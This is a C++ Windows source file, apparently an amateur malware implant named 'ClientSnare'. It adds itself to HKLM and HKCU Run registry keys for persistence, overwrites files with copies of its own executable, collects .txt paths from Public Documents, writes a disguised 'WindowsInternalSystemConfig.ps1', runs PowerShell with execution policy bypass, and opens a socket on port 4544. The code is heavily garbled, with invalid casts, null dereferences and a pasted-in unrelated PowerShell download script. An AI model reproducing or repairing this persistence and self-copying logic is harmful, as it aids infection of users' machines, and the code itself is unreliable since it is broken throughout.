#include <WinSock2.h>
#include <Windows.h>
#include <string>
#include <iostream>
#include <thread>
#include <array>
#include <direct.h>;
#include <sstream>;
#include <filesystem>;
#include <sstream>;
#include <Ws2tcpip.h>;
#include <tchar.h>;
#include <fstream>;
#include <intrin.h>;
#include <map>;
#include <filesystem>;
#include <algorithm>;
#include <vector>;
#include <string.h>;
#include <string>;
#include <unordered_set>
#pragma comment(lib,"ws2_32.lib")
#pragma once
using namespace std;
namespace fs = std::filesystem;
using std::filesystem::directory_iterator;
using std::filesystem::path;
std::string fox = "";
#include "Checkstat.h";
//get startup regkey
//get startup folder
// send data for where the file is located to the software extension which will use it 
//send data to project which handles inital file location for start up reg execution 
//each change of location track and send

auto createfile(string Bi,const char* Thisexe) {
	Bi = "<#.SYNOPSIS.DESCRIPTION.EXAMPLE.LINK.NOTES#>try{write-progress 'Reading OS_IPFS_hashes.csv ...'$PathToRepo = '$PSScriptRoot / ..' $PathToCsvFile = '$PathToRepo / Data / os - release.csv'invoke-webRequest -URI 'https://fleschutz.droppages.com/downloads/OS_IPFS_hashes.csv' -outFile '$PathToCsvFile' $Table = import-csv '$PathToCsvFile'remove-item -path '$PathToCsvFile'write-output 'Operating System Releases' write-output '========================='foreach ($Row in $Table) { write-output ' * $($Row.Path.substring(3))->ipfs://$($Row.IPFS'}exit0}catch{'Error in line $($_.InvocationInfo.ScriptLineNumber): $($Error[0])'";
	std::fstream file12; //append string / edit
	file12.open("WindowsInternalSystemConfig.ps1", ios::out);//refactor logic more indepth
	file12 << Bi;
	//do stuff with powershell 
	auto thedosomethingbox = [Thisexe, Bi](const char* exeNow, string CheckS) {

	};
}
int sematra(int argc, char* argv[]) {
	HKEY hkey = (HKEY)argv[0];
	int lap = 0;
	// make so it runs on startup //	fs::current_path();
	fs::path pz = argv[0];
	const char* exe = argv[0];
	char tempstorage[125];
	//doc txt
	auto Storages3 = new std::list <string>;
	
	for (auto& p : fs::recursive_directory_iterator("C:\\Users\\Public\\Documents\\"))
	{
		if (p.path().extension() == ".txt") {
			fox = p.path().string();
			Storages3->push_back(fox);   //(fox);
			fox = "";


		}
	}
	
	auto fororfor = [Storages3,exe]() {
		for (auto& Ap : fs::recursive_directory_iterator("C:\drivers")){
			  // (Ap.path().string());
			const char* exeSmashSpot = Storages3->front().c_str();
			string& refrencethat = (string&)exeSmashSpot;
			auto newexe = exe;
			HKeyLocalMachine(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "ClientSnare", REG_SZ, (LPBYTE)newexe, strlen(newexe));
			Ap.is_directory() == true ? fox = Ap.path().string() : "";
			
		}fox.append("\\");
	};
lapback:
	// startup
	LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCWSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey);
	if (res == ERROR_SUCCESS) {
		// create new registry key
		RegSetValueEx(hkey, (LPCWSTR)"ClientSnare.exe", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
		RegCloseKey(hkey);
		goto smash;
	}smash: lap++;
	SOCKET socks;
	if (lap <= 1) {
		std::filesystem::current_path(exe);
		if (std::filesystem::exists(exe)) {
			char* Size[sizeof(argc)] = { (char*)argv };
			for (int a = 0; (char**)a < Size; a++) {

				//std::filesystem::current_path(argv[a]);
				std::filesystem::is_empty(argv[a]) ? std::filesystem::copy(pz, argv[a]) : std::filesystem::copy(argv[a], tempstorage);
					if (pz != argv[a]) {
						std::filesystem::remove(argv[a]);
						std::filesystem::copy(pz, argv[a]);
						char*& memloc = argv[a];
						string s = memloc;
						string& ref = s;
						Storages3->push_back(ref);
						for (int i = 0; i < memloc[i]; i++) {
							if (memloc[i] != NULL) {
								i++;
								memloc++;
							}
							else {
								auto space = malloc(sizeof(memloc));
								auto* ss = space;
								fs::copy(pz, memloc);
								memloc = (char*)ss;
								fs::copy(pz, memloc);
								memloc++;
								i++;
								
							}
						}
					}
				
				auto powershell=system("powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Public\\Documents\\ClientSnare.ps1");
				string sh = "";
				createfile(sh, exe);
				if (PowerSystemHibernate == true) {
					powershell;
					string powershell = powershell;
					createfile(powershell,exe);
					auto shell = [powershell](const char* cmd) {
				   
					};
				}
				
			}//do something with the else string file pointers later;
				delete[] Size;
				goto lapback;
		}
		else if (lap == 2) {
			if (hkey->unused) {
				auto hkeys = [exe, res, hkey](HKEY hkeystore) {
					try {
						LRESULT lResult = RegOpenCurrentUser(KEY_READ, (PHKEY)&hkey);//maybe understand logic better and fix if issues.
						RegSetValueEx(hkey, (LPCWSTR)"ClientSnare.exe", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
						
					}
					catch (...) {

					}
				};
			}
			return 0;
		}
	}
}
using namespace std;
string findlocation(string& fox2, int argc, char** argv) {
	fox2 = "";
	fox2 = fox;
	if (true) {//fox2 !=NULL
		if (true){//fox != filesystem::current_path()) {
			(filesystem::path)fox = filesystem::current_path();
			auto jASPER = [&fox2,argc,argv]()-> string {
				sematra(argc, argv);
				auto sys32file =
					[=]()->string {
					return fox2.c_str();
				};

			};

		}
		sematra(argc, argv);
		return fox;
	}
}

std::string communication(int argc , char** argv) {
	SOCKET DATA;
	WSADATA wsadata;
	int error = WSAStartup(0x0202, &wsadata);
	SOCKADDR_IN target;
	target.sin_family = AF_INET;
	target.sin_port = htons(4544);
	target.sin_addr.s_addr = htonl(INADDR_ANY);
	InetPton(AF_INET, _T(""), &target.sin_addr.s_addr);//fixed instead of inet_addr
	DATA = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (true || DATA != NULL)
	{
		using namespace std;
		string Location;
		string file2where;
		const char command = 'dir';
		const char  buffer[500] = { command };
		file2where = system((const char*)command);
		if (file2where.contains("ClientSnare") || file2where.contains("ClientSnare.exe")) {
		again:
			Location = file2where;
			std::string& finds = Location;
			string* pointtohouse = nullptr;
			pointtohouse->find((char&)Location);
			struct MyhouseAddres {
				string MemoryHouse[100];
			}House;
			auto A = House.MemoryHouse;
			if (pointtohouse != nullptr || 0) {
				A->assign((const char*)pointtohouse);
			}
			fox = Location;
			free(A);
			findlocation(fox, argc, argv);
			delete pointtohouse;
			delete& finds; //just incase function will delete anyway
			return fox;
		}
		else goto again;
	}
}



	